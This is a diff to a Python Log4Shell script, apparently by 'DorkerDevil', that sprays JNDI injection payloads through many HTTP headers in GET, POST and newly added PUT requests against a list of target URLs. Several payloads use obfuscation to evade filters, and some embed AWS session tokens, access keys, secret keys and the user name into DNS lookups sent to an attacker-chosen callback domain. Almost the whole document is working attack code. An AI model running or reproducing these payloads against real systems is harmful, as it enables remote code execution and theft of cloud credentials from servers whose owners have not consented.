@@ -11,7 +11,6 @@ from requests.packages import urllib3
 from urllib3 import disable_warnings
 disable_warnings()
 from requests_toolbelt.utils import dump
-import feedparser # pip install feedparser
 import re
 
 #coded_by_DorkerDevil
@@ -20,7 +19,7 @@ target = sys.argv[1]
 ssrf = sys.argv[2] 
 
 S = 10
-ran = ''.join(random.choices(string.ascii_uppercase + string.digits,
+ran = ''.join(random.choices(string.ascii_lowercase + string.digits,
               k=S))
 collab = str(ran) + '.' + ssrf
 
@@ -98,13 +97,13 @@ list = [
 paload = \
     ['${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//:'
       + collab + '/a}', '${jndi:dns://' + collab
-     + '/ext}${jndi:${lower:l}${lower:d}a${lower:p}://' + collab + '/',
+     + '/ext}${jndi:${lower:l}${lower:d}a${lower:p}://' + collab + '/z',
      '${jndi:ldap://${env:user}.' + collab + '/a}', '${jndi:dns://'
      + collab
      + '/.${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}}'
      ,
      '${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.'
-      + collab + '/a}', '${jndi:ldap://${sys:user.name}.'+collab+'}']
+      + collab + '/a}', '${jndi:ldap://${sys:user.name}.'+collab+'/z}', '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'+collab+'/z}']
 
 with open(target, "r", encoding='utf-8') as fd:
     for i in fd.readlines():
@@ -115,11 +114,15 @@ with open(target, "r", encoding='utf-8') as fd:
 for headerz in list:
     for pay in paload:
         target_headerz = {headerz: pay}
-        r = requests.get(url, headers=target_headerz, timeout=None,
+        r = requests.get(url+"/?something="+str(ran), headers=target_headerz, timeout=2,
                          verify=False, allow_redirects=True)
         data = dump.dump_all(r)
         print(data.decode('utf-8'))
-        rpost = requests.post(url, data = pay, headers=target_headerz, timeout=None,
+        rpost = requests.post(url+"/?something="+str(ran), data = pay, headers=target_headerz, timeout=3,
                          verify=False, allow_redirects=True)
         data = dump.dump_all(rpost)
+        print(data.decode('utf-8'))
+        rput = requests.put(url+"/?something="+str(ran), data = pay, headers=target_headerz, timeout=3,
+                         verify=False, allow_redirects=True)
+        data = dump.dump_all(rput)
         print(data.decode('utf-8'))
